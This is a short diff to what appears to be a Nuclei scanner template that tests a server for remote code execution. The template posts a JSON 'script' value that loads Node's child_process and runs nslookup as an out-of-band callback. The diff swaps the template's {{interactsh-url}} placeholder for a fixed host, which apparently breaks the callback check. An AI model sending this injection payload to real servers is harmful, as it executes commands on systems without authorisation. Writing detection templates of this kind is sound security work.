@@ -24,7 +24,7 @@ http:
         Host: {{Hostname}}
         Content-Type: application/json
 
-        {"script":"process.mainModule.require('child_process').exec('nslookup {{interactsh-url}}')"}
+        {"script":"process.mainModule.require('child_process').exec('nslookup interactsh-url.com')"}
 
     matchers:
       - type: dsl
